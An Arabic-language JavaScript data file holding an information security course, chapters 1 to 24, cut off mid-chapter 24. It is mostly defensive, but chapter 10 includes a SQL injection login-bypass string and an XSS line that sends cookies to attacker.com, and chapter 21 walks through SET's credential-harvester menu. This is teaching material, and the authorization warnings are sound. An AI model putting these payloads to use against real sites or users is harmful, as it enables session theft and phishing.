export const basicsData = {
  id: 'basics',
  title: 'أساسيات أمن المعلومات',
  emoji: '📘',
  color: 'green',
  description: 'منهج متكامل من 3 مستويات - من الصفر حتى الاحتراف',
  level: 'مبتدئ / متوسط / متقدم',
  chaptersCount: 27, // 9 فصول لكل مستوى
  pages: '~180 صفحة',
  icon: 'fa-graduation-cap',
  chapters: [
    // ==================== المستوى الأول: مبتدئ (الفصول 1-9) ====================
    {
      number: 1,
      title: '[مبتدئ] ما هو الأمن السيبراني؟ ومثلث CIA',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الأول: مقدمة في الأمن السيبراني</h2>
        <p><strong>الهدف:</strong> فهم ماهية الأمن السيبراني وأهدافه الثلاثة الأساسية.</p>
        <div class="fig-box">
          <i class="fas fa-shield-alt text-neon text-4xl mb-2 block"></i>
          <strong>الشكل 1.1:</strong> مثلث CIA – حجر الزاوية في الأمن السيبراني
        </div>
        <p><strong>السرية (Confidentiality):</strong> ضمان عدم وصول غير المصرح لهم إلى المعلومات. مثال: التشفير، التحكم في الوصول.</p>
        <p><strong>التكامل (Integrity):</strong> التأكد من عدم تعديل البيانات بشكل غير مصرح به. مثال: التجزئات (Hashes)، التواقيع الرقمية.</p>
        <p><strong>التوفر (Availability):</strong> ضمان أن الأنظمة والبيانات متاحة عند الحاجة. مثال: النسخ الاحتياطي، خطط التعافي من الكوارث.</p>
        <div class="code-block">
# مفهوم التجزئة (Hashing) – مثال عملي باستخدام openssl
echo "MASRY STORE" > test.txt
openssl dgst -sha256 test.txt
# الناتج: SHA256(test.txt)= e4d7f1b4... (قيمة ثابتة الطول)
        </div>
        <div class="note-box">
          📌 <strong>نشاط 1:</strong> ابحث عن ثلاثة أمثلة واقعية لانتهاك السرية والتكامل والتوفر في الأخبار (مثل اختراق بيانات، تعديل موقع إلكتروني، انقطاع خدمة).
        </div>
      `
    },
    {
      number: 2,
      title: '[مبتدئ] أنواع التهديدات والهجمات الشائعة',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني: من هم الخصوم؟</h2>
        <p>لفهم الدفاع، يجب معرفة الهجوم. الأنواع الأساسية:</p>
        <ul>
          <li><strong>التصيد الاحتيالي (Phishing):</strong> رسائل بريد إلكتروني مزيفة لسرقة بيانات الدخول. مثال: بريد من "البنك" يطلب تحديث بياناتك.</li>
          <li><strong>البرمجيات الخبيثة (Malware):</strong> فيروسات، أحصنة طروادة، برامج فدية، ديدان.</li>
          <li><strong>هجمات الوسيط (Man-in-the-Middle):</strong> اعتراض الاتصالات بين طرفين (مثل شبكة واي فاي عامة مزيفة).</li>
          <li><strong>هجمات الحرمان من الخدمة (DDoS):</strong> إغراق خادم بحركة مرور لجعله غير متاح.</li>
          <li><strong>الهندسة الاجتماعية (Social Engineering):</strong> خداع الأشخاص بدلاً من الأنظمة (مثال: اتصال هاتفي من "الدعم الفني").</li>
        </ul>
        <div class="warning-box">
          ⚠️ <strong>تنبيه أخلاقي:</strong> هذه المعلومات لأغراض دفاعية فقط. لا تجربها على أنظمة لا تملك الإذن باختبارها.
        </div>
        <div class="note-box">
          📌 <strong>نشاط 2:</strong> صف هجوماً واحداً من كل فئة، واقترح طريقة دفاعية بسيطة لمواجهته.
        </div>
      `
    },
    {
      number: 3,
      title: '[مبتدئ] أساسيات الشبكات والبروتوكولات',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث: كيف تتحرك البيانات؟</h2>
        <p>لفهم هجمات الشبكات، تحتاج إلى أساسيات.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">نموذج OSI والطبقات السبع:</h3>
        <ul>
          <li>طبقة التطبيقات (7) – HTTP, SMTP, FTP.</li>
          <li>طبقة العرض (6) – تشفير البيانات.</li>
          <li>طبقة الجلسة (5) – إدارة الجلسات.</li>
          <li>طبقة النقل (4) – TCP, UDP.</li>
          <li>طبقة الشبكة (3) – IP, ICMP.</li>
          <li>طبقة ربط البيانات (2) – Ethernet, ARP.</li>
          <li>طبقة المادية (1) – الكابلات، الإشارات.</li>
        </ul>
        <p><strong>المنافذ الشائعة:</strong> 80 (HTTP)، 443 (HTTPS)، 22 (SSH)، 21 (FTP)، 53 (DNS)، 3389 (RDP).</p>
        <div class="code-block">
# أوامر عملية لاستكشاف الشبكة
ping google.com                     # اختبار الاتصال
tracert google.com                  # تتبع مسار الحزم (ويندوز)
nslookup masry0-store.vercel.app    # استعلام DNS
        </div>
        <div class="note-box">
          📌 <strong>نشاط 3:</strong> استخدم الأمر <code>netstat -an</code> على جهازك ولاحظ المنافذ المفتوحة. ما هي الخدمات التي تعتقد أنها تعمل عليها؟
        </div>
      `
    },
    {
      number: 4,
      title: '[مبتدئ] أساسيات أنظمة التشغيل (ويندوز ولينكس)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع: فهم بيئة العمل</h2>
        <p>سواء كنت تستخدم ويندوز أو لينكس، يجب أن تعرف أساسيات الحماية.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">لويندوز:</h3>
        <ul>
          <li>تحديث النظام بانتظام (Windows Update).</li>
          <li>تفعيل جدار الحماية Windows Defender و Microsoft Defender Antivirus.</li>
          <li>إعداد التحكم في حساب المستخدم (UAC).</li>
          <li>إنشاء مستخدم عادي (وليس مسؤولاً) للاستخدام اليومي.</li>
        </ul>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">للينكس (مثل Ubuntu):</h3>
        <ul>
          <li>تحديث النظام: <code>sudo apt update && sudo apt upgrade -y</code></li>
          <li>إدارة الصلاحيات: <code>sudo</code>, <code>chmod</code>, <code>chown</code>.</li>
          <li>تعطيل الخدمات غير الضرورية: <code>sudo systemctl disable bluetooth</code>.</li>
          <li>استخدام جدار الحماية: <code>sudo ufw enable</code>.</li>
        </ul>
        <div class="code-block">
# أوامر مهمة لتأمين لينكس
sudo ufw allow 22/tcp
sudo passwd -l root
sudo grep "Failed password" /var/log/auth.log
        </div>
        <div class="note-box">
          📌 <strong>نشاط 4:</strong> قم بتثبيت جهاز افتراضي لأوبونتو (باستخدام VirtualBox) وطبّق أوامر التحصين أعلاه.
        </div>
      `
    },
    {
      number: 5,
      title: '[مبتدئ] التشفير (Cryptography) الأساسي',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس: كيف تحمي بياناتك؟</h2>
        <ul>
          <li><strong>التشفير المتماثل (Symmetric):</strong> مفتاح واحد للتشفير وفك التشفير (مثال: AES). يستخدم في تشفير الملفات والقرص الصلب.</li>
          <li><strong>التشفير اللامتماثل (Asymmetric):</strong> زوج مفاتيح (خاص وعام). يستخدم في التوقيع الرقمي وتبادل المفاتيح الآمن (مثال: RSA).</li>
          <li><strong>دوال التجزئة (Hashing):</strong> تحول البيانات إلى قيمة ثابتة الطول، لا يمكن الرجوع عنها (مثال: SHA-256). تستخدم للتحقق من التكامل ولتخزين كلمات المرور.</li>
        </ul>
        <div class="code-block">
# مثال: حساب تجزئة SHA-256 لملف
sha256sum myfile.txt

# مثال: تشفير متماثل باستخدام openssl
openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc -pass pass:mypassword

# فك التشفير
openssl enc -d -aes-256-cbc -in secret.enc -out secret_decrypted.txt -pass pass:mypassword
        </div>
        <div class="note-box">
          📌 <strong>نشاط 5:</strong> جرب تشفير ملف نصي باستخدام AES ثم فك تشفيره. ماذا يحدث إذا استخدمت كلمة مرور خاطئة؟
        </div>
      `
    },
    {
      number: 6,
      title: '[مبتدئ] أمن كلمات المرور والمصادقة متعددة العوامل (MFA)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس: حماية هويتك الرقمية</h2>
        <p>كلمات المرور هي خط الدفاع الأول، لكنها ضعيفة إذا لم تُدار بشكل صحيح.</p>
        <ul>
          <li>استخدم كلمات مرور طويلة (12 حرفاً على الأقل) وتحتوي على أحرف كبيرة وصغيرة وأرقام ورموز.</li>
          <li>لا تعيد استخدام نفس كلمة المرور في حسابات متعددة.</li>
          <li>استخدم مدير كلمات مرور (مثل Bitwarden أو Keepass أو 1Password) لتخزينها بشكل آمن.</li>
          <li>فعّل المصادقة متعددة العوامل (MFA) حيثما أمكن (تطبيق Google Authenticator، Authy، أو رسائل SMS).</li>
        </ul>
        <div class="note-box">
          🔐 <strong>نشاط 6:</strong> اختر حساباً مهماً (مثل البريد الإلكتروني) وفعّل MFA باستخدام Google Authenticator. جرّب تسجيل الدخول مرة أخرى لتجربة العملية.
        </div>
      `
    },
    {
      number: 7,
      title: '[مبتدئ] أمن الشبكات المنزلية والواي فاي',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع: تأمين منزلك الرقمي</h2>
        <ul>
          <li>قم بتغيير كلمة مرور جهاز الراوتر الافتراضية (عادة "admin/admin").</li>
          <li>استخدم تشفير WPA2 أو WPA3 (لا تستخدم WEP أو WPA القديم).</li>
          <li>قم بتعطيل WPS (Wi-Fi Protected Setup) لأنه ثغرة أمنية معروفة.</li>
          <li>أنشئ شبكة ضيف (Guest Network) للزوار.</li>
          <li>قم بتحديث ثابت (firmware) جهاز الراوتر بانتظام.</li>
          <li>غرّير اسم شبكة الواي فاي (SSID) ولا تستخدم اسماً يكشف عن نوع الراوتر أو عنوان منزلك.</li>
        </ul>
        <div class="fig-box">
          <i class="fas fa-wifi text-neon text-2xl mb-2 block"></i>
          الشكل 7.1: إعدادات أمان الواي فاي – اختر WPA2 أو WPA3
        </div>
      `
    },
    {
      number: 8,
      title: '[مبتدئ] حماية الأجهزة من البرامج الضارة',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن: الوقاية خير من العلاج</h2>
        <ul>
          <li>قم بتثبيت برنامج مكافحة فيروسات موثوق (Windows Defender كافٍ للمستخدم العادي).</li>
          <li>قم بتحديث برامجك ونظام التشغيل بانتظام (التصحيحات الأمنية).</li>
          <li>لا تقم بتحميل أو تشغيل ملفات من مصادر غير موثوقة (بريد عشوائي، مواقع قرصنة).</li>
          <li>قم بتعطيل تشغيل الماكرو في ملفات Office إذا لم تكن بحاجة إليه (الماكرو وسيلة شائعة لنشر الفيروسات).</li>
          <li>استخدم أداة فحص إضافية مثل Malwarebytes بشكل دوري.</li>
        </ul>
        <div class="note-box">
          📌 <strong>نشاط 8:</strong> افحص جهازك باستخدام أداة مضاد فيروسات (مثل Windows Defender Offline Scan).
        </div>
      `
    },
    {
      number: 9,
      title: '[مبتدئ] مراجعة المستوى الأول واختبار',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع: اختبار الفهم للمستوى المبتدئ</h2>
        <p>أجب عن الأسئلة التالية لاختبار فهمك:</p>
        <ol>
          <li>اشرح مثلث CIA وأعط مثالاً واحداً لكل عنصر.</li>
          <li>ما الفرق بين التصيد الاحتيالي وهجوم الهندسة الاجتماعية؟</li>
          <li>ما هو أمر ping وماذا يفعل؟</li>
          <li>اكتب أمراً لتحديث نظام Ubuntu عبر الطرفية.</li>
          <li>ما الفرق بين التشفير المتماثل واللامتماثل؟</li>
          <li>لماذا تعتبر المصادقة متعددة العوامل مهمة حتى مع وجود كلمة مرور قوية؟</li>
          <li>ما هو إعداد WPA2 في إعدادات الراوتر؟</li>
          <li>اذكر ثلاث طرق لحماية جهازك من البرامج الضارة.</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الأول:</strong> قم بتأمين جهاز كمبيوتر منزلي (حقيقي أو افتراضي) بتطبيق ما تعلمته: تحديث النظام، تفعيل جدار الحماية، تثبيت برنامج مضاد فيروسات، إنشاء كلمة مرور قوية لجهاز الراوتر، وتشغيل MFA لحساب بريدك الإلكتروني. دوّن الخطوات التي اتبعتها في مستند.</p>
      `
    },
    // ==================== المستوى الثاني: متوسط (الفصول 10-18) ====================
    {
      number: 10,
      title: '[متوسط] أمن تطبيقات الويب – SQL Injection و XSS',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العاشر: تهديدات الويب الأكثر شيوعاً</h2>
        <p>تطبيقات الويب هي الهدف الأول للمخترقين. سنغطي ثغرتين أساسيتين.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">SQL Injection (حقن SQL)</h3>
        <p>استغلال عدم تنقية المدخلات للوصول إلى قاعدة البيانات. مثال: إدخال <code>' OR '1'='1' --</code> في حقل اسم المستخدم لتجاوز تسجيل الدخول.</p>
        <div class="code-block">
# مثال بسيط لاستعلام SQL ضعيف:
SELECT * FROM users WHERE username = '$username' AND password = '$password'

# إذا أدخل المهاجم: username = 'admin' --  يصبح الاستعلام:
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
        </div>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">Cross-Site Scripting (XSS)</h3>
        <p>حقن كود JavaScript في صفحات الويب لسرقة الجلسات أو تشويه المحتوى. مثال: <code>&lt;script&gt;alert('Hacked')&lt;/script&gt;</code></p>
        <div class="code-block">
# مثال لسرقة الكوكيز عبر XSS:
&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;
        </div>
        <div class="note-box">
          🛡️ <strong>الوقاية:</strong> استخدم الاستعلامات المعلمة (Parameterized Queries) لمنع SQLi، وتنقية المخرجات (Output Encoding) لمنع XSS.
        </div>
        <div class="warning-box">
          ⚠️ <strong>تنبيه:</strong> لا تجرب هذه الأكواد على مواقع حقيقية دون إذن. استخدم منصات تدريب مثل PortSwigger Web Security Academy.
        </div>
      `
    },
    {
      number: 11,
      title: '[متوسط] أمن الشبكات – جدران الحماية و IDS/IPS',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي عشر: أدوات الدفاع عن الشبكة</h2>
        <ul>
          <li><strong>جدار الحماية (Firewall):</strong> يصفف حركة المرور بناءً على قواعد (السماح/المنع).</li>
          <li><strong>نظام كشف التسلل (IDS):</strong> يراقب حركة المرور ويُصدر تنبيهاً عند اكتشاف هجوم (مثل Snort).</li>
          <li><strong>نظام منع التسلل (IPS):</strong> مثل IDS لكنه يمنع الهجوم تلقائياً.</li>
        </ul>
        <div class="code-block">
# تثبيت Snort IDS على Ubuntu
sudo apt install snort -y
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
# بعد التشغيل، حاول فحص جهازك (مثلاً باستخدام nmap) وسترى تنبيهات Snort.
        </div>
        <div class="fig-box">
          <i class="fas fa-chart-line text-neon text-2xl mb-2 block"></i>
          الشكل 11.1: آلية عمل IDS/IPS
        </div>
      `
    },
    {
      number: 12,
      title: '[متوسط] إدارة السجلات وتحليلها – أساسيات SIEM',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني عشر: عيون الأمن – جمع وتحليل السجلات</h2>
        <p>SIEM (Security Information and Event Management) يجمع السجلات من مصادر متعددة ويكشف الأنماط الشاذة.</p>
        <ul>
          <li><strong>سجلات ويندوز الرئيسية:</strong> Security (أحداث المصادقة)، System، Application.</li>
          <li><strong>سجلات لينكس:</strong> /var/log/auth.log، /var/log/syslog.</li>
        </ul>
        <div class="code-block">
# استعلام PowerShell لتحليل أحداث تسجيل الدخول الفاشلة
Get-EventLog -LogName Security -EntryType FailureAudit -Newest 20 | Format-Table -AutoSize

# في لينكس، البحث عن محاولات SSH الفاشلة
sudo grep "Failed password" /var/log/auth.log
        </div>
        <p>أدوات SIEM مفتوحة المصدر: <strong>ELK Stack (Elasticsearch, Logstash, Kibana)</strong>، <strong>Wazuh</strong>، <strong>Graylog</strong>.</p>
      `
    },
    {
      number: 13,
      title: '[متوسط] تحليل الحزم باستخدام Wireshark و tcpdump',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث عشر: الغوص في حركة الشبكة</h2>
        <p>تحليل الحزم أداة أساسية لاكتشاف هجمات الشبكات وتحليل حركة المرور المشبوهة.</p>
        <div class="code-block">
# التقاط الحزم باستخدام tcpdump وحفظها في ملف
sudo tcpdump -i eth0 -s 1500 -w capture.pcap
# فتح الملف في Wireshark (واجهة رسومية) وفلترة الحزم
        </div>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">مرشحات Wireshark المفيدة:</h3>
        <ul>
          <li><code>http.request</code> – عرض طلبات HTTP فقط.</li>
          <li><code>tcp.port == 443</code> – اتصالات HTTPS.</li>
          <li><code>dns.qry.name contains "malware"</code> – البحث عن استعلامات DNS مشبوهة.</li>
          <li><code>tcp.flags.syn == 1 and tcp.flags.ack == 0</code> – محاولات إنشاء اتصال SYN (قد تشير إلى هجوم).</li>
        </ul>
      `
    },
    {
      number: 14,
      title: '[متوسط] إدارة الثغرات وتطبيق التصحيحات',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع عشر: البقاء في مأمن من الثغرات المعروفة</h2>
        <p>إدارة الثغرات (Vulnerability Management) هي عملية دورية لاكتشاف الثغرات وتقييمها وعلاجها.</p>
        <ul>
          <li><strong>المسح الضوئي:</strong> استخدام أدوات مثل OpenVAS أو Nessus لفحص الأنظمة بحثاً عن ثغرات معروفة.</li>
          <li><strong>تحليل المخاطر:</strong> تحديد أولوية الثغرات بناءً على خطورتها (Critical, High, Medium, Low).</li>
          <li><strong>إدارة التصحيحات (Patch Management):</strong> تطبيق التحديثات الأمنية في الوقت المناسب.</li>
          <li><strong>إعادة الفحص للتأكد من الإصلاح.</strong></li>
        </ul>
        <div class="code-block">
# تثبيت OpenVAS (Greenbone Vulnerability Management) على Ubuntu
sudo apt install gvm -y
sudo gvm-setup
sudo gvm-check-setup
# بعد التثبيت، افتح المتصفح على https://127.0.0.1:9392 لبدء المسح.
        </div>
      `
    },
    {
      number: 15,
      title: '[متوسط] مقدمة في الاستجابة للحوادث (Incident Response)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس عشر: ماذا تفعل بعد الاختراق؟</h2>
        <p>الاستجابة للحوادث هي عملية منظمة للتعامل مع الاختراقات. تعتمد على أطر مثل <strong>NIST SP 800-61</strong> أو <strong>SANS PICERL</strong>.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">مراحل PICERL:</h3>
        <ol>
          <li><strong>التحضير (Preparation):</strong> تجهيز الأدوات والفرق والخطط.</li>
          <li><strong>التحديد (Identification):</strong> اكتشاف الاختراق وجمع الأدلة الأولية.</li>
          <li><strong>الاحتواء (Containment):</strong> عزل الأنظمة المتأثرة لمنع انتشار الهجوم.</li>
          <li><strong>الاستئصال (Eradication):</strong> إزالة السبب الجذري للاختراق.</li>
          <li><strong>الاسترداد (Recovery):</strong> استعادة الأنظمة والبيانات من النسخ الاحتياطية.</li>
          <li><strong>الدروس المستفادة (Lessons Learned):</strong> توثيق الحادثة وتحسين الإجراءات.</li>
        </ol>
        <div class="note-box">
          📌 <strong>نشاط 15:</strong> اكتب خطة استجابة للحوادث مكونة من صفحة واحدة لمؤسسة صغيرة (5-10 موظفين). حدد فريق الاستجابة، أدوات الاتصال، وإجراءات الاحتواء الأولية.
        </div>
      `
    },
    {
      number: 16,
      title: '[متوسط] مقدمة في التحليل الجنائي الرقمي (Digital Forensics)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس عشر: جمع الأدلة دون تدميرها</h2>
        <p>التحليل الجنائي الرقمي هو فرع من علوم الطب الشرعي يهتم بجمع وتحليل الأدلة الرقمية بطريقة مقبولة قانونياً.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">مبادئ أساسية:</h3>
        <ul>
          <li>لا تلمس القرص الأصلي – استخدم نسخة طبق الأصل (forensic image).</li>
          <li>توثيق كل إجراء (سلسلة الحفظ – Chain of Custody).</li>
          <li>استخدم أدوات متخصصة مثل Autopsy، FTK Imager، Volatility.</li>
        </ul>
        <div class="code-block">
# إنشاء صورة قرص باستخدام dd (لينكس)
sudo dd if=/dev/sdb of=/mnt/evidence/image.dd bs=4096
# حساب التجزئة للتأكد من سلامة الصورة
sha256sum /mnt/evidence/image.dd
        </div>
      `
    },
    {
      number: 17,
      title: '[متوسط] تقييم المخاطر وإطار NIST CSF',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع عشر: كيف تقيم المخاطر بشكل منهجي؟</h2>
        <p>إطار NIST CSF (Cybersecurity Framework) يتكون من 5 وظائف أساسية: تحديد (Identify)، حماية (Protect)، كشف (Detect)، استجابة (Respond)، استرداد (Recover).</p>
        <p><strong>خطوات تقييم المخاطر العملية:</strong></p>
        <ol>
          <li>تحديد الأصول (الخوادم، قواعد البيانات، أجهزة الموظفين).</li>
          <li>تحديد التهديدات (هجمات إلكترونية، أخطاء بشرية، كوارث طبيعية).</li>
          <li>تقدير الاحتمالية والتأثير (من 1 إلى 5).</li>
          <li>حساب درجة المخاطرة (الاحتمالية × التأثير).</li>
          <li>تحديد خيارات المعالجة (تقليل، نقل، قبول، تجنب).</li>
        </ol>
        <div class="code-block">
# مثال على سجل المخاطر (Risk Register)
| Asset      | Threat          | Likelihood | Impact | Risk Score | Treatment        |
|------------|-----------------|------------|--------|------------|------------------|
| CRM DB     | SQL Injection   | 4          | 5      | 20         | Implement WAF    |
| Public WiFi | MitM Attack     | 3          | 4      | 12         | Use VPN          |
        </div>
      `
    },
    {
      number: 18,
      title: '[متوسط] مراجعة المستوى الثاني واختبار',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن عشر: اختبار الفهم للمستوى المتوسط</h2>
        <ol>
          <li>اشرح ثغرة SQL Injection بمثال بسيط، واذكر طريقة الوقاية.</li>
          <li>ما الفرق بين IDS و IPS؟</li>
          <li>كيف يمكنك عرض آخر 10 أحداث فشل تسجيل دخول على ويندوز باستخدام PowerShell؟</li>
          <li>ما هي مراحل الاستجابة للحوادث وفق نموذج PICERL؟</li>
          <li>ما هي أهمية سلسلة الحفظ (Chain of Custody) في التحليل الجنائي؟</li>
          <li>اذكر مثالاً على تقييم مخاطر (احتمالية عالية وتأثير عالي) وكيف تعالجه.</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الثاني:</strong> أنشئ بيئة مختبرية افتراضية (باستخدام VirtualBox) تتكون من جهاز أوبونتو وجهاز ويندوز. قم بتثبيت Snort على أوبونتو، وشغّل فحص nmap من جهاز آخر وحلل تنبيهات Snort. ثم التقط حزمة باستخدام tcpdump وافتحها في Wireshark. دوّن ملاحظاتك.</p>
      `
    },
    // ==================== المستوى الثالث: متقدم (الفصول 19-27) ====================
    {
      number: 19,
      title: '[متقدم] أتمتة المهام الأمنية باستخدام Python',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع عشر: كتابة أدواتك الأمنية</h2>
        <p>الأتمتة تزيد من كفاءة المحلل الأمني.</p>
        <div class="code-block">
# سكريبت بسيط لفحص المنافذ المفتوحة باستخدام بايثون
import socket

target = "192.168.1.1"
ports = [22, 80, 443, 3306]

for port in ports:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((target, port))
    if result == 0:
        print(f"Port {port} is open")
    sock.close()
        </div>
        <div class="code-block">
# سكريبت للتحقق من وجود ملف في VirusTotal
import requests

api_key = "YOUR_VIRTUAL_TOTAL_API_KEY"
file_hash = "e4d7f1b4..."  # ضع تجزئة ملف حقيقي هنا
url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
headers = {"x-apikey": api_key}
response = requests.get(url, headers=headers)
print(response.json())
        </div>
        <div class="note-box">
          📌 <strong>نشاط 19:</strong> قم بتثبيت بايثون على جهازك، وطبّق سكريبت فحص المنافذ على شبكتك المنزلية (بإذنك). جرّب تعديله لفحص نطاق من عناوين IP.
        </div>
      `
    },
    {
      number: 20,
      title: '[متقدم] أمن السحابة والمبادئ الأساسية (Cloud Security)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العشرون: حماية البيئات السحابية</h2>
        <p>مع التحول إلى السحابة (AWS، Azure، GCP)، يجب فهم نموذج المسؤولية المشتركة (Shared Responsibility Model).</p>
        <ul>
          <li><strong>المسؤولية عن أمن السحابة (Security of the Cloud):</strong> موفر السحابة مسؤول عن أمن البنية التحتية (مراكز البيانات، الشبكات، الأجهزة).</li>
          <li><strong>المسؤولية عن الأمن في السحابة (Security in the Cloud):</strong> العميل مسؤول عن تكوين الموارد، إدارة الهوية، تشفير البيانات، وتأمين التطبيقات.</li>
        </ul>
        <p>أدوات مراقبة السحابة: AWS CloudTrail، Azure Monitor، Google Cloud Logging. يمكن استخدام أدوات CSPM (Cloud Security Posture Management) مثل Prowler (مفتوح المصدر) للكشف عن التكوينات الخاطئة.</p>
        <div class="code-block">
# مثال: استخدام AWS CLI لتحليل سجلات CloudTrail
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin
        </div>
      `
    },
    {
      number: 21,
      title: '[متقدم] هندسة الاجتماعيات وأدواتها (OSINT المتقدم)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي والعشرون: استخبارات المصادر المفتوحة والهندسة الاجتماعية</h2>
        <p>جمع المعلومات من المصادر العامة (OSINT) خطوة حاسمة في اختبار الاختراق. الأدوات:</p>
        <ul>
          <li><strong>theHarvester:</strong> لجمع عناوين البريد الإلكتروني والنطاقات الفرعية.</li>
          <li><strong>Shodan:</strong> للبحث عن أجهزة متصلة بالإنترنت.</li>
          <li><strong>Maltego:</strong> لتحليل العلاقات بين البيانات.</li>
          <li><strong>Google Dorks:</strong> أوامر بحث متقدمة للعثور على معلومات حساسة (مثل: site:example.com filetype:pdf confidential).</li>
        </ul>
        <div class="code-block">
# جمع رسائل بريد إلكتروني لنطاق معين
theHarvester -d example.com -b google

# تثبيت وتشغيل Social-Engineer Toolkit (SET)
sudo apt install setoolkit -y
sudo setoolkit
# اختر 1) Social-Engineering Attacks
# ثم 2) Website Attack Vectors
# ثم 3) Credential Harvester Attack Method
        </div>
        <div class="warning-box">
          ⚠️ <strong>تنبيه أخلاقي:</strong> استخدم هذه الأدوات فقط على أهداف تملك الإذن باختبارها، أو على بيئتك الخاصة.
        </div>
      `
    },
    {
      number: 22,
      title: '[متقدم] سياسات الأمن وإطار الحوكمة (GRC)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني والعشرون: بناء سياسات أمنية فعالة</h2>
        <p>السياسات هي الوثائق عالية المستوى التي تحدد أهداف الأمن ومبادئه. أمثلة على سياسات أساسية:</p>
        <ul>
          <li><strong>سياسة التحكم في الوصول (Access Control Policy).</strong></li>
          <li><strong>سياسة قبول المخاطر (Risk Acceptance Policy).</strong></li>
          <li><strong>سياسة الاستجابة للحوادث (Incident Response Policy).</strong></li>
          <li><strong>سياسة التصنيف والتعامل مع البيانات (Data Classification Policy).</strong></li>
        </ul>
        <div class="code-block">
# مثال على سياسة كلمات المرور:
- الحد الأدنى لطول كلمة المرور: 12 حرفًا.
- يجب أن تحتوي على أحرف كبيرة وصغيرة وأرقام ورموز.
- يتم تغيير كلمة المرور كل 90 يومًا.
- يمنع إعادة استخدام آخر 5 كلمات مرور.
- يتم تخزين كلمات المرور باستخدام تجزئة (hashing) مع ملح (salt).
        </div>
        <div class="note-box">
          📌 <strong>نشاط 22:</strong> اكتب مسودة لسياسة أمن المعلومات لمؤسسة صغيرة (لا تتجاوز صفحتين). تشمل: أهداف الأمن، نطاق التطبيق، الأدوار والمسؤوليات، إجراءات الإبلاغ عن الحوادث.
        </div>
      `
    },
    {
      number: 23,
      title: '[متقدم] تحليل البرمجيات الخبيثة للمبتدئين (مقدمة)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث والعشرون: كيف تتعامل مع ملف مشبوه؟</h2>
        <p>تحليل المالفير (Malware Analysis) ينقسم إلى:</p>
        <ul>
          <li><strong>تحليل ساكن (Static):</strong> فحص الملف دون تشغيله (بحث عن سلاسل، فحص الهيدر، كشف الحزم).</li>
          <li><strong>تحليل ديناميكي (Dynamic):</strong> تشغيل الملف في بيئة معزولة ومراقبة السلوك (اتصالات الشبكة، تغييرات السجل، عمليات الملفات).</li>
        </ul>
        <div class="code-block">
# استخراج السلاسل النصية من ملف مشبوه (static)
strings suspicious.exe > strings.txt

# حساب تجزئة الملف
sha256sum suspicious.exe

# استخدام فيروس توتال API لفحص التجزئة
curl -s "https://www.virustotal.com/api/v3/files/$(sha256sum suspicious.exe | cut -d' ' -f1)" --header "x-apikey: YOUR_API_KEY"
        </div>
        <div class="note-box">
          📌 <strong>نشاط 23:</strong> اختر ملفاً تنفيذياً عادياً (غير ضار) من جهازك، وجرّب حساب تجزئته واستخراج السلاسل النصية منه. هل تجد أي شيء مثير للاهتمام (مثل أسماء دوال Windows API)؟
        </div>
      `
    },
    {
      number: 24,
      title: '[متقدم] اختبار الاختراق الأخلاقي (مقدمة للممارسة القانونية)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع والعشرون: كيف تبدأ في اختبار الاختراق؟</h2>
        <p>اختبار الاختراق الأخلاقي هو محاكاة هجمات حقيقية بإذن مسبق. مراحله:</p>
        <ol>
          <li><strong>جمع المعلومات (Reconnaissance):</strong> OSINT، مسح الشبكة.</li>
          <li><strong>المسح الضوئي (Scanning):</strong> Nmap، فتح المنافذ، اكتشاف الخدمات.</li>
          <li><strong>تحليل الثغرات (Vulnerability Analysis):</strong> استخدام OpenVAS أو Nessus.</li>
          <li><strong>الاستغلال (Exploitation):</strong> Metasploit أو سكريبتات مخصصة.</li>
          <li><strong>رفع الامتيازات (Post-Exploitation):</strong> الحصول على صلاحيات الجذر.</li>
          <li><strong>كتابة التقرير (Reporting):</strong> توثيق الثغرات والإصلاحات.</li>
        </ol>
        <div class="code-block">
# مثال: فحص المنافذ المفتوحة باستخدام Nmap
nmap -sS -p 1-1000 192.168.1.1
